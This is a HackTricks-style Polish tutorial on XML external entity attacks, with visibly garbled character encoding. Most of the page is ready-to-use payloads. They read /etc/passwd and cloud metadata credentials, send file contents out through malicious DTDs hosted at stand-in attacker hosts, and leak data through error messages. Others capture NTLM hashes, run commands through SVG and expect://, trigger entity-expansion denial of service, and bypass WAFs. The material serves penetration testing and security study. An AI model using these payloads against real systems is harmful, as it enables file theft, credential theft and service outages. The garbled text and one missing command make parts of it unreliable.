# XXE - XEE - Zewntrzne Encje XML

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>


## Podstawy XML

XML to jzyk znacznik贸w przeznaczony do przechowywania i transportu danych, charakteryzujcy si elastyczn struktur, kt贸ra umo偶liwia u偶ycie opisowo nazwanych znacznik贸w. R贸偶ni si od HTML, nie bdc ograniczonym do zestawu predefiniowanych znacznik贸w. Znaczenie XML-u zmalao wraz z wzrostem popularnoci JSON-a, pomimo pocztkowej roli w technologii AJAX.

- **Reprezentacja danych za pomoc encji**: Encje w XML umo偶liwiaj reprezentacj danych, w tym specjalnych znak贸w takich jak `&lt;` i `&gt;`, kt贸re odpowiadaj `<` i `>` w celu uniknicia konfliktu z systemem znacznik贸w XML.

- **Definiowanie element贸w XML**: XML umo偶liwia definiowanie typ贸w element贸w, okrelajc, jak powinny by zbudowane i jak zawarto mog zawiera, od dowolnego rodzaju zawartoci do okrelonych element贸w podrzdnych.

- **Definicja typu dokumentu (DTD)**: DTD jest kluczowy w XML do definiowania struktury dokumentu i typ贸w danych, kt贸re mo偶e zawiera. Mog by wewntrzne, zewntrzne lub kombinacj obu, okrelajc, jak formatowane i walidowane s dokumenty.

- **Niestandardowe i zewntrzne encje**: XML obsuguje tworzenie niestandardowych encji w ramach DTD w celu elastycznej reprezentacji danych. Zewntrzne encje, zdefiniowane za pomoc adresu URL, budz obawy dotyczce bezpieczestwa, zwaszcza w kontekcie atak贸w z wykorzystaniem zewntrznych encji XML (XXE), kt贸re wykorzystuj spos贸b, w jaki parsery XML obsuguj zewntrzne 藕r贸da danych: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Wykrywanie XXE za pomoc encji parametrowych**: W celu wykrywania podatnoci XXE, zwaszcza gdy konwencjonalne metody zawodz ze wzgldu na rodki bezpieczestwa parsera, mo偶na wykorzysta encje parametrowe XML. Te encje umo偶liwiaj wykorzystanie technik wykrywania poza pasmem, takich jak wywoywanie odpytywa DNS lub 偶da HTTP do kontrolowanej domeny, w celu potwierdzenia podatnoci.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## G贸wne ataki

**[Wikszo tych atak贸w zostaa przetestowana za pomoc niesamowitych laboratori贸w XEE Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Nowe testowe encje

W tym ataku sprawdz, czy prosta deklaracja nowej encji dziaa.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Odczytaj plik

Spr贸bujmy odczyta `/etc/passwd` na r贸偶ne sposoby. Dla systemu Windows mo偶esz spr贸bowa odczyta: `C:\windows\system32\drivers\etc\hosts`

W tym pierwszym przypadku zauwa偶, 偶e SYSTEM "_\*\*file:///\*\*etc/passwd_" r贸wnie偶 zadziaa.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Ten drugi przypadek mo偶e by przydatny do wydobycia pliku, jeli serwer internetowy u偶ywa PHP (Nie dotyczy to laboratori贸w Portswiggers).
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
W tym trzecim przypadku zauwa偶amy, 偶e deklarujemy `Element stockCheck` jako ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Wywietlanie listy katalog贸w

W aplikacjach opartych na **Java** istnieje mo偶liwo **wywietlenia zawartoci katalogu** za pomoc XXE, u偶ywajc takiego payloadu (proba o wywietlenie katalogu zamiast pliku):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE mo偶e by wykorzystane do nadu偶ycia SSRF w chmurze
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Korzystajc z **wczeniej omawianej techniki**, mo偶esz sprawi, 偶e serwer uzyska dostp do serwera, kt贸ry kontrolujesz, aby pokaza, 偶e jest podatny. Ale jeli to nie dziaa, mo偶e to by spowodowane tym, 偶e **nie s dozwolone jednostki XML**, w takim przypadku mo偶esz spr贸bowa u偶y **jednostek parametru XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Wyciek danych poza pasmem

**W tym przypadku zamierzamy zmusi serwer do zaadowania nowego DTD z zoliwym adunkiem, kt贸ry wyle zawarto pliku za pomoc 偶dania HTTP (dla plik贸w wielolinijkowych mo偶na spr贸bowa wycieku za pomoc** _**ftp://**_**). Wyjanienie to oparte jest na** [**laboratorium Portswiggers tutaj**](https://portswigger.net/web-security/xxe/blind)**.**

W podanym zoliwym DTD wykonuje si szereg krok贸w w celu wycieku danych:

### Przykad zoliwego DTD:
Struktura jest nastpujca:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Kroki wykonane przez ten DTD obejmuj:

1. **Definicja parametru encji:**
- Tworzona jest encja parametru XML o nazwie `%file`, kt贸ra odczytuje zawarto pliku `/etc/hostname`.
- Kolejna encja parametru XML o nazwie `%eval` jest definiowana. Dynamicznie deklaruje now encj parametru XML o nazwie `%exfiltrate`. Encja `%exfiltrate` jest ustawiona tak, aby wysa 偶danie HTTP do serwera atakujcego, przekazujc zawarto encji `%file` w cigu zapytania URL.

2. **Wykonanie encji:**
- Wykorzystuje si encj `%eval`, co prowadzi do wykonania dynamicznej deklaracji encji `%exfiltrate`.
- Nastpnie u偶ywa si encji `%exfiltrate`, co powoduje wysanie 偶dania HTTP do okrelonego adresu URL z zawartoci pliku.

Atakujcy hostuje ten zoliwy DTD na serwerze pod swoj kontrol, zwykle pod adresem URL takim jak `http://web-attacker.com/malicious.dtd`.

**adunek XXE:**
Aby wykorzysta podatn aplikacj, atakujcy wysya adunek XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ten payload definiuje parametrow jednostk XML `%xxe` i wcza j w DTD. Po przetworzeniu przez parser XML, ten payload pobiera zewntrzne DTD z serwera atakujcego. Nastpnie parser interpretuje DTD w linii, wykonujc kroki opisane w zoliwym DTD i prowadzc do wycieku pliku `/etc/hostname` na serwer atakujcego.


### Oparte na bdach (zewntrzne DTD)

**W tym przypadku spowodujemy, 偶e serwer zaaduje zoliwe DTD, kt贸re poka偶e zawarto pliku w komunikacie o bdzie (to jest mo偶liwe tylko wtedy, gdy mo偶na zobaczy komunikaty o bdach).** [**Przykad std.**](https://portswigger.net/web-security/xxe/blind)

Komunikat o bdzie parsowania XML, ujawniajcy zawarto pliku `/etc/passwd`, mo偶na wywoa za pomoc zoliwego zewntrznego Dokumentu Definicji Typu (DTD). Osiga si to za pomoc nastpujcych krok贸w:

1. Zdefiniowana jest parametrowa jednostka XML o nazwie `file`, kt贸ra zawiera zawarto pliku `/etc/passwd`.
2. Zdefiniowana jest parametrowa jednostka XML o nazwie `eval`, kt贸ra zawiera dynamiczn deklaracj dla innej parametrowej jednostki XML o nazwie `error`. Ta jednostka `error`, po ewaluacji, pr贸buje zaadowa nieistniejcy plik, wczajc zawarto jednostki `file` jako jego nazw.
3. Wywoywana jest jednostka `eval`, co prowadzi do dynamicznej deklaracji jednostki `error`.
4. Wywoanie jednostki `error` skutkuje pr贸b zaadowania nieistniejcego pliku, co powoduje komunikat o bdzie zawierajcy zawarto pliku `/etc/passwd` jako cz nazwy pliku.

Zoliwe zewntrzne DTD mo偶na wywoa za pomoc nastpujcego XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Po wykonaniu, odpowied藕 serwera WWW powinna zawiera komunikat bdu wywietlajcy zawarto pliku `/etc/passwd`.


![](<../.gitbook/assets/image (223) (1).png>)

_**Nale偶y zauwa偶y, 偶e zewntrzne DTD pozwala nam na umieszczenie jednej jednostki w drugiej (****`eval`****), ale jest to zabronione w przypadku wewntrznego DTD. Dlatego nie mo偶na wymusi bdu bez u偶ycia zewntrznego DTD (zazwyczaj).**_

### **Oparte na bdach (system DTD)**

Co z podatnociami na lepe XXE, gdy **blokowane s interakcje poza pasmem** (brak dostpnych pocze zewntrznych)?.

Luka w specyfikacji jzyka XML mo偶e **odsoni poufne dane za pomoc komunikat贸w bd贸w, gdy w DTD dokumentu mieszaj si deklaracje wewntrzne i zewntrzne**. Ten problem umo偶liwia wewntrzne przedefiniowanie jednostek zadeklarowanych zewntrznie, uatwiajc wykonanie atak贸w XXE opartych na bdach. Takie ataki wykorzystuj przedefiniowanie parametru jednostki XML, pierwotnie zadeklarowanego w zewntrznym DTD, z poziomu wewntrznego DTD. Gdy poczenia poza pasmem s blokowane przez serwer, atakujcy musz polega na lokalnych plikach DTD, aby przeprowadzi atak, majcy na celu wywoanie bdu analizy w celu ujawnienia poufnych informacji.


Rozwa偶my scenariusz, w kt贸rym system plik贸w serwera zawiera plik DTD o cie偶ce `/usr/local/app/schema.dtd`, definiujcy jednostk o nazwie `custom_entity`. Atakujcy mo偶e wywoa bd analizy XML, ujawniajcy zawarto pliku `/etc/passwd`, przesyajc hybrydowe DTD w nastpujcy spos贸b:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Kroki przedstawione s w tym DTD:

- Definicja parametru XML o nazwie `local_dtd` obejmuje zewntrzny plik DTD znajdujcy si na systemie plik贸w serwera.
- Nastpuje ponowna definicja parametru XML `custom_entity`, pierwotnie zdefiniowanego w zewntrznym DTD, w celu zawarcia [eksploitacji XXE opartej na bdach](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ta ponowna definicja ma na celu wywoanie bdu parsowania, ujawniajcego zawarto pliku `/etc/passwd`.
- Poprzez u偶ycie parametru `local_dtd`, aktywowany zostaje zewntrzny DTD, obejmujcy nowo zdefiniowany `custom_entity`. Ta sekwencja dziaa prowadzi do wygenerowania komunikatu o bdzie, kt贸ry jest celem eksploitacji.


**Przykad z 偶ycia wzity:** Systemy korzystajce z rodowiska graficznego GNOME czsto maj DTD w lokalizacji `/usr/share/yelp/dtd/docbookx.dtd`, zawierajcy jednostk o nazwie `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Poniewa偶 ta technika wykorzystuje **wewntrzne DTD, musisz najpierw znale藕 wa偶ne**. Mo偶esz to zrobi, **instalujc** ten sam **system operacyjny / oprogramowanie**, kt贸rego u偶ywa serwer, i **szukajc domylnych DTD**, lub **pobierajc list** domylnych DTD w systemach i **sprawdzajc**, czy kt贸ry z nich istnieje:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Aby uzyska wicej informacji, sprawd藕 [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Znajdowanie DTD w systemie

W nastpujcym niesamowitym repozytorium github mo偶na znale藕 **cie偶ki DTD, kt贸re mog by obecne w systemie**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Ponadto, jeli masz **obraz Dockera systemu ofiary**, mo偶esz u偶y narzdzia z tego samego repozytorium do **skanowania** **obrazu** i **znalezienia** cie偶ki **DTD**, kt贸ra jest obecna w systemie. Przeczytaj [Readme na githubie](https://github.com/GoSecure/dtd-finder), aby dowiedzie si jak to zrobi.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE za pomoc parser贸w Office Open XML

Dla bardziej szczeg贸owego wyjanienia tego ataku, **sprawd藕 drug sekcj [tego niesamowitego postu](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) od Detectify**.

Mo偶liwo **przesyania dokument贸w Microsoft Office jest oferowana przez wiele aplikacji internetowych**, kt贸re nastpnie przetwarzaj pewne szczeg贸y tych dokument贸w. Na przykad, aplikacja internetowa mo偶e umo偶liwia u偶ytkownikom importowanie danych poprzez przesanie arkusza kalkulacyjnego w formacie XLSX. Aby parser m贸g wycign dane z arkusza kalkulacyjnego, konieczne jest przetworzenie co najmniej jednego pliku XML.

Aby przetestowa t podatno, konieczne jest utworzenie **pliku Microsoft Office zawierajcego adunek XXE**. Pierwszym krokiem jest utworzenie pustego katalogu, do kt贸rego mo偶na rozpakowa dokument.

Po rozpakowaniu dokumentu, plik XML znajdujcy si w `./unzipped/word/document.xml` powinien zosta otwarty i edytowany w preferowanym edytorze tekstu (np. vim). XML powinien zosta zmodyfikowany w celu dodania 偶danego adunku XXE, czsto zaczynajc od 偶dania HTTP.

Zmodyfikowane linie XML powinny zosta wstawione midzy dwa g贸wne obiekty XML. Wa偶ne jest, aby zastpi adres URL monitorowalnym adresem URL dla 偶da.

Na koniec, plik mo偶na spakowa, aby utworzy zoliwy plik poc.docx. Z wczeniej utworzonego katalogu "unzipped", nale偶y uruchomi nastpujce polecenie:

Teraz utworzony plik mo偶na przesa do potencjalnie podatnej aplikacji internetowej i mie nadziej, 偶e 偶danie pojawi si w dziennikach Burp Collaborator.


### Protok贸 Jar:

Protok贸 **jar** jest dostpny wycznie w **aplikacjach Java**. Jest on zaprojektowany w celu umo偶liwienia dostpu do plik贸w w archiwum **PKZIP** (np. `.zip`, `.jar`, itp.), obsugujc zar贸wno pliki lokalne, jak i zdalne.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Aby m贸c uzyska dostp do plik贸w wewntrz plik贸w PKZIP, jest **bardzo przydatne do wykorzystania XXE za pomoc plik贸w DTD systemu**. Sprawd藕 [t sekcj, aby dowiedzie si, jak wykorzysta pliki DTD systemu](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Proces uzyskiwania dostpu do pliku wewntrz archiwum PKZIP za pomoc protokou jar obejmuje kilka krok贸w:

1. Wysyane jest 偶danie HTTP w celu pobrania archiwum zip z okrelonego miejsca, takiego jak `https://download.website.com/archive.zip`.
2. Odpowied藕 HTTP zawierajca archiwum jest tymczasowo przechowywana na systemie, zwykle w lokalizacji takiej jak `/tmp/...`.
3. Archiwum jest nastpnie rozpakowywane, aby uzyska dostp do jego zawartoci.
4. Odczytywany jest konkretny plik wewntrz archiwum, `file.zip`.
5. Po zakoczeniu operacji, wszelkie tymczasowe pliki utworzone podczas tego procesu s usuwane.

Interesujc technik, kt贸ra przerywa ten proces na drugim kroku, jest utrzymanie otwartego poczenia serwera przez czas nieokrelony podczas udostpniania pliku archiwum. Narzdzia dostpne w [tym repozytorium](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) mog by wykorzystane w tym celu, w tym serwer Pythona (`slow_http_server.py`) i serwer Javy (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Zapisywanie plik贸w w katalogu tymczasowym mo偶e pom贸c w **eskalacji innej podatnoci zwizanej z przechodzeniem cie偶ki** (takiej jak lokalne doczanie plik贸w, wstrzykiwanie szablon贸w, XSLT RCE, deserializacja itp.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Atak Billion Laugh

Atak Billion Laugh (miliard miech贸w) jest jednym z rodzaj贸w atak贸w typu Denial of Service (DoS), kt贸ry wykorzystuje podatno na ataki XML External Entity (XXE). W tym ataku, zoliwie spreparowany plik XML jest wysyany do serwera, kt贸ry pr贸buje go przetworzy. Plik XML zawiera wiele zagnie偶d偶onych encji, kt贸re odwouj si do siebie nawzajem, tworzc nieskoczon ptl. To powoduje, 偶e serwer zu偶ywa du偶 ilo zasob贸w, takich jak pami i moc obliczeniowa, co prowadzi do niedostpnoci usugi dla innych u偶ytkownik贸w.

Atak Billion Laugh mo偶e by bardzo skuteczny, poniewa偶 serwer pr贸buje przetworzy nieskoczon liczb encji, co prowadzi do wyczerpania zasob贸w. Aby zabezpieczy si przed tym atakiem, serwery powinny by skonfigurowane w taki spos贸b, aby nie przetwarzay zagnie偶d偶onych encji lub ograniczay ich liczb.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Atak Yaml

Yaml (Yet Another Markup Language) jest popularnym formatem danych, kt贸ry jest czsto u偶ywany do konfiguracji aplikacji. Atak Yaml polega na wykorzystaniu podatnoci w parsowaniu danych Yaml w celu wykonania nieautoryzowanych dziaa.

##### Jak dziaa atak Yaml?

Atak Yaml wykorzystuje podatno w parserze Yaml, kt贸ry nieprawidowo obsuguje niezaufane dane wejciowe. Atakujcy mo偶e wstrzykn zoliwy kod Yaml, kt贸ry zostanie wykonany przez parser, co mo偶e prowadzi do r贸偶nych niebezpiecznych dziaa, takich jak wykonanie dowolnego kodu na serwerze.

##### Przykad ataku Yaml

Poni偶ej przedstawiono przykad ataku Yaml, w kt贸rym atakujcy pr贸buje wywoa komend systemow na serwerze:

```yaml
!!python/object/apply:os.system ['ls']
```

W powy偶szym przykadzie, atakujcy wykorzystuje zoliwy kod Yaml, aby wywoa komend systemow "ls" na serwerze. Jeli parser Yaml nie jest odpowiednio zabezpieczony, to taka manipulacja mo偶e zosta wykonana.

##### Jak si chroni przed atakiem Yaml?

Aby chroni si przed atakiem Yaml, nale偶y:

- Unika parsowania niezaufanych danych Yaml.
- Sprawdza i filtrowa dane wejciowe, aby zapobiec wstrzykiwaniu zoliwego kodu Yaml.
- Aktualizowa parser Yaml do najnowszej wersji, kt贸ra zawiera poprawki bezpieczestwa.
- Korzysta z narzdzi do analizy statycznej kodu, kt贸re mog wykrywa potencjalne podatnoci w kodzie Yaml.

##### Podsumowanie

Atak Yaml wykorzystuje podatno w parserze Yaml, aby wykona nieautoryzowane dziaania na serwerze. Aby si przed nim chroni, nale偶y unika parsowania niezaufanych danych Yaml, sprawdza i filtrowa dane wejciowe oraz aktualizowa parser Yaml do najnowszej wersji.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Atak kwadratowego rozdmuchiwania

![](<../.gitbook/assets/image (531).png>)

#### Uzyskiwanie NTML

Na hostach Windows mo偶liwe jest uzyskanie skr贸tu NTML u偶ytkownika serwera sieciowego poprzez ustawienie obsugi responder.py:
```bash
Responder.py -I eth0 -v
```
i wysyajc nastpujce 偶danie
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Nastpnie mo偶esz spr贸bowa zama hasz u偶ywajc hashcat

## Ukryte powierzchnie XXE

### XInclude

Podczas integrowania danych klienta w dokumenty XML po stronie serwera, takie jak te w 偶daniach SOAP, bezporednia kontrola nad struktur XML jest czsto ograniczona, co utrudnia tradycyjne ataki XXE ze wzgldu na ograniczenia dotyczce modyfikacji elementu `DOCTYPE`. Jednak atak `XInclude` zapewnia rozwizanie, pozwalajc na wstawienie zewntrznych jednostek w dowolnym elemencie danych dokumentu XML. Ta metoda jest skuteczna nawet wtedy, gdy tylko cz danych w generowanym przez serwer dokumencie XML mo偶e by kontrolowana.

Aby przeprowadzi atak `XInclude`, nale偶y zadeklarowa przestrze nazw `XInclude` i okreli cie偶k pliku dla zamierzonej zewntrznej jednostki. Poni偶ej znajduje si zwizy przykad, jak taki atak mo偶e by sformuowany:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Sprawd藕 [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) po wicej informacji!

### SVG - Przesyanie plik贸w

Pliki przesyane przez u偶ytkownik贸w do okrelonych aplikacji, kt贸re nastpnie s przetwarzane na serwerze, mog wykorzystywa podatnoci w obsudze plik贸w XML lub plik贸w zawierajcych XML. Powszechne formaty plik贸w, takie jak dokumenty biurowe (DOCX) i obrazy (SVG), oparte s na XML.

Kiedy u偶ytkownicy **przesyaj obrazy**, te obrazy s przetwarzane lub sprawdzane po stronie serwera. Nawet dla aplikacji oczekujcych format贸w takich jak PNG lub JPEG, **biblioteka przetwarzania obraz贸w serwera mo偶e r贸wnie偶 obsugiwa obrazy SVG**. SVG, bdc formatem opartym na XML, mo偶e by wykorzystany przez atakujcych do przesyania zoliwych obraz贸w SVG, nara偶ajc w ten spos贸b serwer na podatnoci XXE (XML External Entity).

Poni偶ej przedstawiono przykad takiego ataku, w kt贸rym zoliwy obraz SVG pr贸buje odczyta pliki systemowe:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Inna metoda polega na pr贸bie **wykonania polece** za pomoc opakowania PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
W obu przypadkach format SVG jest wykorzystywany do przeprowadzenia atak贸w wykorzystujcych mo偶liwoci przetwarzania XML przez oprogramowanie serwera, co podkrela konieczno solidnej walidacji danych wejciowych i zabezpiecze.

Sprawd藕 [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) po wicej informacji!

**Zauwa偶, 偶e pierwsza linia odczytanego pliku lub wyniku wykonania pojawi si W RODKU utworzonego obrazu SVG. Musisz mie dostp do utworzonego obrazu SVG.**

### **PDF - Przesyanie plik贸w**

Przeczytaj nastpujcy post, aby **dowiedzie si, jak wykorzysta XXE przesyajc plik** PDF:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Od x-www-urlencoded do XML

Jeli 偶danie POST akceptuje dane w formacie XML, mo偶esz spr贸bowa wykorzysta XXE w tym 偶daniu. Na przykad, jeli normalne 偶danie zawiera:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
W takim przypadku mo偶esz spr贸bowa przesa nastpujce 偶danie, z tym samym rezultatem:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Z JSON do XEE

Aby zmieni 偶danie, mo偶esz u偶y rozszerzenia Burp o nazwie "**Content Type Converter**". [Tutaj](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) znajdziesz ten przykad:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Inny przykad mo偶na znale藕 [tutaj](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF i obejcia zabezpiecze

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
To dziaa tylko wtedy, gdy serwer XML akceptuje protok贸 `data://`.

### UTF-7

